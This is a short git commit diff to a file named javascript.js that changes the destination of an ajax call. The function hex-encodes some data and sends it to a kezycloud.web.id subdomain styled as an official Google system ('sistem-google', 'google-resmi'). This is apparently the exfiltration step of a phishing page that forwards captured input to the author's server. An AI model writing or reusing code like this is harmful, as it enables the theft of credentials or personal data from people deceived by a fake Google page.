4bc513b454bebca95b9d69baae0fecf63b601824
gacor282 <kezycloud@gmail.com>
2025-05-29 13:11:52 +0700

    Update javascript.js

--- javascript.js
+++ javascript.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://eagle-minjs.kezycloud.web.id/sistem-google/?google=" +
+                    "https://kezy-google-resmi25.kezycloud.web.id/sistem-google/?google=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
